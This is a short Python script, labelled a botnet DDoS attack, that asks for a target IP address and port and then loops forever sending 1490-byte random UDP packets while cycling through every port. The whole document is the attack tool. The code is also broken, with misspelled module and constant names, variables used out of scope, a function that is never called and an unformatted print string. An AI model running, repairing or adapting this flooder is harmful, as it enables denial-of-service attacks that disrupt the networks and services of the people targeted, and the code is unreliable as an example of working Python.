import sys
import os
import time
import socket
import random
import ipadress



#botnet ddos-attack
##########
sock = socket.socket(socket.AF_INET, socket.SOCK_DEGRAM)
bytes = random._urandom(1490)
#########



def main( ):
    os.system("clear")
    os.system("figlet DDos Attack")
    print
    print ("Author: UNK\nReview:koda")
    print
    vitima = (input("IP Target :  "))
    port = int(input("Port :    ")) 
    os.system("clear") 
    ip = int(input(ipadress.  ip_adress(vitima))
    sent = 0



while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print ("sent {sent} packet to {ip}    throught port:{port}")
    if    port == 65534:
	      port = 1